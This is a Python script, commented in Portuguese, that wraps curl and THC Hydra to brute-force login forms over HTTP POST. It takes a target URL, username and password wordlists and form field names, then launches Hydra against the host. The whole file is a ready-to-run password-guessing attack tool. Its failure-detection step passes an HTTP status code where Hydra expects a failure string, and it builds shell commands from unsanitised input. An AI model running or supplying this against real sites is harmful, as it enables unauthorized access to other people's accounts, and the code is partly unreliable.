import subprocess
import sys
import os
from urllib.parse import urlparse

# Função para ler usernames de arquivos ou de uma entrada única
def read_usernames(usernames_input):
    if os.path.isfile(usernames_input):
        with open(usernames_input, "r") as file:
            return file.read().splitlines()
    else:
        return [usernames_input]

# Função para separar host e endpoint
def separate_url(url):
    parsed_url = urlparse(url)
    host = parsed_url.netloc  # Retorna apenas o host sem o esquema
    endpoint = parsed_url.path if parsed_url.path else "/"
    return host, endpoint

# Função para obter o código de status HTTP usando curl
def get_error_message(url, username_field, password_field):
    # Comando curl para enviar uma solicitação POST com credenciais inválidas, retornando apenas o código de status
    curl_command = f'curl -o /dev/null -s -w "%{{http_code}}" -d "{username_field}=invalid_user&{password_field}=invalid_pass" {url}'

    # Executar o comando curl e capturar a saída
    result = subprocess.run(curl_command, shell=True, capture_output=True, text=True)

    if result.returncode != 0:
        print("Erro ao executar o comando curl.")
        print(result.stderr)
        sys.exit(1)

    # Retornar o código de status HTTP
    return result.stdout

# Inputs do usuário
target_url = input("Digite o URL alvo (ex: 'http://testphp.vulnweb.com/userinfo.php'): ")
usernames_input = input("Digite um username único ou o caminho para um arquivo de usernames: ")
passwords_input = input("Digite o caminho para o arquivo de senhas (ex: 'top-100.txt'): ")

# Campos do POST request
username_field = input("Digite o campo de username (ex: 'uname'): ")
password_field = input("Digite o campo de senha (ex: 'pass'): ")

# Lendo usernames
usernames = read_usernames(usernames_input)

# Verificando se há usernames
if not usernames:
    print("Nenhum username encontrado.")
    sys.exit()

# Lendo senhas
with open(passwords_input, "r") as file:
    passwords = [line.strip() for line in file]

# Verificando se há senhas
if not passwords:
    print("Nenhuma senha encontrada.")
    sys.exit()

# Separando host e endpoint
target_host, endpoint = separate_url(target_url)

# Obtendo a mensagem de erro automaticamente
error_message = get_error_message(target_url, username_field, password_field)

# Definindo o parâmetro do Hydra
if len(usernames) > 1:
    username_option = f"-L {usernames_input}"  # Usar arquivo de usernames
else:
    username_option = f"-l {usernames[0]}"  # Usar username único

password_option = f"-P {passwords_input}"  # Usar arquivo de senhas

# Comando Hydra
hydra_command = f"hydra {username_option} {password_option} {target_host} http-post-form '{endpoint}:{username_field}=^USER^&{password_field}=^PASS^:{error_message.strip()}'"

# Executando o comando Hydra
try:
    print("Executando o comando Hydra...")
    subprocess.run(hydra_command, shell=True, check=True)
except subprocess.CalledProcessError as e:
    print(f"Erro ao executar o Hydra: {e}")
